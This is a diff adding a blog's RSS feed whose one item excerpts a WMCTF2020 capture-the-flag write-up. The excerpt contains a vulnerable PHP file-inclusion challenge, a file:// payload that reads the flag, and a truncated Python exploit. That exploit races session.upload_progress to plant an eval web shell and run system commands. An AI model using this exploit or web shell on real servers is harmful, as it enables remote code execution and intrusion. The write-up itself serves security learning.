@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>session.upload_progress文件包含 on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/session.upload_progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
+    <description>Recent content in session.upload_progress文件包含 on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 03 Aug 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/session.upload_progress%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>W&amp;MCTF2020</title>
+      <link>https://anthem-whisper.github.io/p/wmctf2020/</link>
+      <pubDate>Mon, 03 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/wmctf2020/</guid>
+      <description>0day大战，，，打不动，告辞
+ web_checkin 考点：文件包含file协议
+&amp;lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) {$content = $_GET[&#39;content&#39;];if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))die(&#39;hacker&#39;);if(file_exists($content))require_once($content);file_put_contents($content,&#39;&amp;lt;?php exit();&#39;.$content);}直接file读取根目录flag
+?content=file:///flagWMCTF{a1sc8591as98c1a96s85c165as1cas7d89}
+Make PHP Great Again 考点：session.upload_progress文件包含，条件竞争
+referer:https://www.freebuf.com/news/202819.html
+exp:
+#coding=utf-8import ioimport requestsimport threadingsessid = &#39;TGAO&#39;data = {&amp;quot;cmd&amp;quot;:&amp;quot;system(&#39;tac /var/www/html/flag.php&#39;);&amp;quot;}def write(session):while True:f = io.BytesIO(b&#39;a&#39; *100* 50)resp = session.post( &#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&#39;}, files={&#39;file&#39;: (&#39;tgao.</description>
+    </item>
+    
+  </channel>
+</rss>
